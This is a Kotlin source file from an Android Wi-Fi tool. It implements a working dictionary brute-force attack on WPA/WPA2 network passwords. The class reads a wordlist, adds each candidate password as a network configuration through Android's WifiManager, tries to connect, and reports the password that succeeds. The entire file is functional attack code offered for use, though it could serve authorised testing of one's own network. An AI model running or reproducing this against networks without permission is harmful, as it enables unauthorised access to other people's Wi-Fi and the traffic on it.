package com.lsd.wififrankenstein.util

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.wifi.SupplicantState
import android.net.wifi.WifiConfiguration
import android.net.wifi.WifiManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext
import java.io.BufferedReader
import java.io.InputStreamReader
import kotlin.coroutines.resume













class NativePskBruteForceRunner(private val context: Context) {

    companion object {
        private const val TAG = "NativePskBruteForceRunner"
        private const val ATTEMPT_TIMEOUT_MS = 20_000L
        private const val ATTEMPT_DELAY_MS = 1_000L
    }

    private val wifiManager =
        context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager

    @Volatile
    private var cancelled = false

    suspend fun runAttack(
        ssid: String,
        bssid: String,
        wordlistUri: android.net.Uri,
        onProgress: ((PskBruteForceProgress) -> Unit)? = null
    ): PskBruteForceResult = withContext(Dispatchers.IO) {
        cancelled = false
        Log.d(TAG, "=== NATIVE PSK BRUTE FORCE START ===")
        Log.d(TAG, "ssid=$ssid, bssid=$bssid, uri=$wordlistUri")

        var attempts = 0
        var totalLines = 0
        val enabledNetworks = snapshotEnabledNetworks()

        try {
            val in1 = context.contentResolver.openInputStream(wordlistUri)
                ?: return@withContext PskBruteForceResult(null, false, 0)
            BufferedReader(InputStreamReader(in1)).use { br ->
                while (br.readLine() != null) totalLines++
            }
            Log.d(TAG, "Wordlist total lines: $totalLines")

            val in2 = context.contentResolver.openInputStream(wordlistUri)
                ?: return@withContext PskBruteForceResult(null, false, 0)
            BufferedReader(InputStreamReader(in2)).use { br ->
                var line: String?
                while (br.readLine().also { line = it } != null) {
                    if (cancelled) break
                    val password = line!!.trim()
                    if (password.isEmpty() || password.startsWith("#") || password.length < 8) {
                        attempts++
                        continue
                    }

                    attempts++
                    Log.d(TAG, "Attempt $attempts/$totalLines: trying '$password'")
                    onProgress?.invoke(
                        PskBruteForceProgress(
                            currentPassword = password,
                            attemptNumber = attempts,
                            totalPasswords = totalLines,
                            statusMessage = "Trying: $password"
                        )
                    )

                    when (testPassword(ssid, bssid, password)) {
                        Outcome.CONNECTED -> {
                            Log.d(TAG, "SUCCESS! Password found: $password")
                            onProgress?.invoke(
                                PskBruteForceProgress(
                                    currentPassword = password,
                                    attemptNumber = attempts,
                                    totalPasswords = totalLines,
                                    statusMessage = "FOUND: $password"
                                )
                            )
                            return@withContext PskBruteForceResult(password, true, attempts)
                        }

                        Outcome.FAILED, Outcome.TIMEOUT -> {
                            Log.d(TAG, "Attempt $attempts failed for '$password'")
                        }
                    }

                    delay(ATTEMPT_DELAY_MS)
                }
            }

            Log.d(TAG, "=== NATIVE PSK BRUTE FORCE END (not found after $attempts attempts) ===")
            PskBruteForceResult(null, false, attempts)
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            Log.e(TAG, "Native PSK brute force failed", e)
            PskBruteForceResult(null, false, attempts)
        } finally {
            restoreEnabledNetworks(enabledNetworks)
        }
    }

    fun cancel() {
        Log.d(TAG, "Native PSK brute force cancellation requested")
        cancelled = true
    }

    private fun snapshotEnabledNetworks(): List<Int> {
        return try {
            wifiManager.configuredNetworks
                ?.filter { it.status == WifiConfiguration.Status.ENABLED }
                ?.mapNotNull { it.networkId }
                ?: emptyList()
        } catch (e: Exception) {
            Log.w(TAG, "snapshotEnabledNetworks failed", e)
            emptyList()
        }
    }

    private fun restoreEnabledNetworks(ids: List<Int>) {
        if (ids.isEmpty()) return
        try {
            ids.forEach { id ->
                try {
                    wifiManager.enableNetwork(id, false)
                } catch (_: Exception) {
                }
            }
            Log.d(TAG, "Restored ${ids.size} previously enabled networks")
        } catch (e: Exception) {
            Log.w(TAG, "restoreEnabledNetworks failed", e)
        }
    }

    private enum class Outcome { CONNECTED, FAILED, TIMEOUT }

    private suspend fun testPassword(ssid: String, bssid: String, password: String): Outcome {
        if (password.length < 8 || password.length > 63) return Outcome.FAILED
        val config = buildConfig(ssid, bssid, password)
        var netId = -1
        try {
            netId = wifiManager.addNetwork(config)
            if (netId == -1) {
                Log.w(TAG, "addNetwork failed for '$password'")
                return Outcome.FAILED
            }
            wifiManager.disconnect()




            val outcome = waitForOutcome(ssid, bssid, netId) {
                wifiManager.enableNetwork(netId, true)
                wifiManager.reconnect()
            }
            if (outcome != Outcome.CONNECTED) {
                try {
                    wifiManager.removeNetwork(netId)
                } catch (e: Exception) {
                    Log.w(TAG, "removeNetwork failed for netId=$netId", e)
                }
            }
            return outcome
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            Log.e(TAG, "testPassword error for '$password'", e)
            if (netId != -1) {
                try {
                    wifiManager.removeNetwork(netId)
                } catch (_: Exception) {
                }
            }
            return Outcome.FAILED
        }
    }

    private fun buildConfig(ssid: String, bssid: String, password: String): WifiConfiguration {
        return WifiConfiguration().apply {
            SSID = "\"$ssid\""
            BSSID = bssid
            status = WifiConfiguration.Status.DISABLED
            allowedKeyManagement.set(WifiConfiguration.KeyMgmt.WPA_PSK)
            allowedAuthAlgorithms.set(WifiConfiguration.AuthAlgorithm.OPEN)
            allowedProtocols.set(WifiConfiguration.Protocol.WPA)
            allowedProtocols.set(WifiConfiguration.Protocol.RSN)
            allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.CCMP)
            allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.TKIP)
            allowedGroupCiphers.set(WifiConfiguration.GroupCipher.CCMP)
            allowedGroupCiphers.set(WifiConfiguration.GroupCipher.TKIP)
            preSharedKey = "\"$password\""
        }
    }

    private suspend fun waitForOutcome(
        ssid: String,
        bssid: String,
        netId: Int,
        trigger: () -> Unit
    ): Outcome {
        return suspendCancellableCoroutine { continuation ->
            val handler = Handler(Looper.getMainLooper())
            var receiver: BroadcastReceiver? = null
            var prevState: SupplicantState? = null

            fun finish(outcome: Outcome) {
                if (continuation.isCompleted) return
                handler.removeCallbacksAndMessages(null)
                receiver?.let {
                    try {
                        context.unregisterReceiver(it)
                    } catch (_: Exception) {
                    }
                }
                continuation.resume(outcome)
            }

            receiver = object : BroadcastReceiver() {
                override fun onReceive(context: Context?, intent: Intent?) {
                    when (intent?.action) {
                        WifiManager.SUPPLICANT_STATE_CHANGED_ACTION -> {
                            val errorCode = intent.getIntExtra(
                                WifiManager.EXTRA_SUPPLICANT_ERROR,
                                -1
                            )
                            val newState = newStateOf(intent)
                            Log.d(
                                TAG,
                                "SUPPLICANT_STATE_CHANGED state=$newState errorCode=$errorCode"
                            )
                            if (errorCode == WifiManager.ERROR_AUTHENTICATING) {
                                finish(Outcome.FAILED)
                            } else {
                                when (newState) {
                                    SupplicantState.COMPLETED -> finish(Outcome.CONNECTED)
                                    SupplicantState.DISCONNECTED -> {
                                        if (prevState == SupplicantState.FOUR_WAY_HANDSHAKE ||
                                            prevState == SupplicantState.GROUP_HANDSHAKE
                                        ) {
                                            finish(Outcome.FAILED)
                                        }
                                    }

                                    SupplicantState.INACTIVE -> {

                                        try {
                                            wifiManager.enableNetwork(netId, true)
                                        } catch (_: Exception) {
                                        }
                                    }

                                    else -> {}
                                }
                            }
                            prevState = newState
                        }

                        WifiManager.NETWORK_STATE_CHANGED_ACTION -> {
                            val currentSsid =
                                currentSsid()?.replace("\"", "")
                            Log.d(
                                TAG,
                                "NETWORK_STATE_CHANGED currentSsid=$currentSsid target=$ssid"
                            )
                            if (currentSsid == ssid) {
                                finish(Outcome.CONNECTED)
                            }
                        }
                    }
                }
            }

            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    context.registerReceiver(receiver, filter(), Context.RECEIVER_NOT_EXPORTED)
                } else {
                    context.registerReceiver(receiver, filter())
                }
            } catch (e: Throwable) {
                Log.w(TAG, "registerReceiver failed", e)
                finish(Outcome.TIMEOUT)
                return@suspendCancellableCoroutine
            }

            handler.postDelayed({
                val current = currentSsid()?.replace("\"", "")
                if (current == ssid) finish(Outcome.CONNECTED) else finish(Outcome.TIMEOUT)
            }, ATTEMPT_TIMEOUT_MS)

            try {
                trigger()
            } catch (e: Exception) {
                Log.w(TAG, "trigger failed", e)
                finish(Outcome.TIMEOUT)
                return@suspendCancellableCoroutine
            }

            continuation.invokeOnCancellation {
                handler.removeCallbacksAndMessages(null)
                receiver?.let {
                    try {
                        context.unregisterReceiver(it)
                    } catch (_: Exception) {
                    }
                }
            }
        }
    }

    private fun filter(): IntentFilter {
        return IntentFilter().apply {
            addAction(WifiManager.SUPPLICANT_STATE_CHANGED_ACTION)
            addAction(WifiManager.NETWORK_STATE_CHANGED_ACTION)
        }
    }

    @Suppress("DEPRECATION")
    private fun newStateOf(intent: Intent): SupplicantState? {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            intent.getParcelableExtra(WifiManager.EXTRA_NEW_STATE, SupplicantState::class.java)
        } else {
            intent.getParcelableExtra(WifiManager.EXTRA_NEW_STATE)
        }
    }

    private fun currentSsid(): String? {
        return try {
            wifiManager.connectionInfo?.ssid
        } catch (e: Exception) {
            Log.w(TAG, "connectionInfo read failed", e)
            null
        }
    }
}
